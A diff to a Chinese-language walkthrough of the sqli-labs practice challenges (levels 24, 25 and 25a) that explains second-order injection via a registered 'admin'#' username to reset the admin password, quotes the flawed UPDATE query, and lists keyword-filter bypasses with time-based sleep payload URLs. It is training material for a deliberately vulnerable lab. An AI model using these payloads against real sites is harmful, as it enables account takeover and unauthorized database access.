@@ -184,6 +184,36 @@
 
 1. 注入语句如后 `http://192.168.3.148/Less-23/?id=11' and sleep(5) and '1'='1`
 
+## 第二十四关
+
+这里考察的是二阶注入  
+一般二阶注入的思路可以是先注册一个存在sql注入语句的用户名，比如存在显错注入的语句。  
+但据说这里在往数据库中写入的时候存在长度显示，所以注册一个如后的用户`admin'#`，在登陆后，在重置密码的时候会忽略原密码直接把admin账户的密码重置掉。  
+存在问题的重置密码语句如下  
+`$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";`
+
+## 第二十五关
+
+1. 这里测试`and`和`&&`和`or`和`#`被过滤，可以这么绕过 `||`和`oorr`和`anandd`和`%23`  
+实际注入语句 `http://192.168.3.148/Less-25/?id=1' anandd sleep(5) %23`
+
+    ```txt
+    url编码对照：
+    %23    #
+
+    等效替代：
+    and &&
+    or ||
+
+    基本绕过滤：
+    and   AnD
+    anandd
+    ```
+
+## 第二十五a关
+
+1. 注入语句如后 `http://192.168.3.148/Less-25a/?id=1 anandd sleep(5)`
+
 ## 感谢以下博文的原作者
 
 > https://blog.csdn.net/sdb5858874/article/details/80727555  
@@ -191,4 +221,4 @@ https://blog.csdn.net/alex_seo/article/details/82148955
 https://blog.csdn.net/qq_34444097/article/details/83043678  
 https://blog.csdn.net/qq_28295425/article/details/78905978  
 https://blog.csdn.net/u012763794/article/details/51361152  
-
+https://www.cnblogs.com/AmoBlogs/p/8683218.html
